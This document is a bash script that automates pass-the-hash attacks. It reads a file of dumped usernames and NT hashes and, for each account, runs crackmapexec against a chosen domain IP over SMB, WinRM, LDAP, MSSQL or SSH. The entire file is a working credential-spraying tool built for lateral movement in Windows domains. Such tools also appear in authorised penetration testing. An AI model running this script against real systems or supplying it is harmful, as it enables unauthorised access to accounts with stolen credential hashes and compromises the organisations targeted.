#!/bin/bash

while test $# -gt 0; do
  case "$1" in
    -h|--help)
      echo "usage: $package [-h] [-dc-ip DOMAIN IP] [-p PROTOCOL] {mssql,winrm,ssh,ldap,smb} -f [HASH FILE]"
      echo " "
      echo "options:"
      echo "-h, --help                show brief help"
      echo "-dc-ip                    domain ip"
      echo "-p --protocol             protocol that is testing (crackmapexec protocols)"
      echo "-f, --hashfile=DIR        file that includes hashes with usernames"
      exit 0
      ;;
    -dc-ip)
      shift
      if test $# -gt 0; then
        ip=$1
      else
        echo "Domain IP is missing"
        exit 1
      fi
      shift
      ;;
    -p)
      shift
      if test $# -gt 0; then
        protocol=$1
      else
        echo "protocol is missing"
        exit 1
      fi
      shift
      ;;
    -f)
      shift
      if test $# -gt 0; then
        hashfile=$1
      else
        echo "hash file is not specified"
        exit 1
      fi
      shift
      ;;
    *)
      break
      ;;
  esac
done


for line in $(cat $hashfile)
do
    username=$(echo $line | cut -d ':' -f 1)
    hash=$(echo $line | cut -d ':' -f 4)
    echo "$username:$hash"
    echo " "
    echo "crackmapexec $protocol $ip -u $username -H $hash"
    crackmapexec $protocol $ip -u $username -H $hash
    sleep 2
    echo " "
    echo "-------------------------------------------------------------"
done
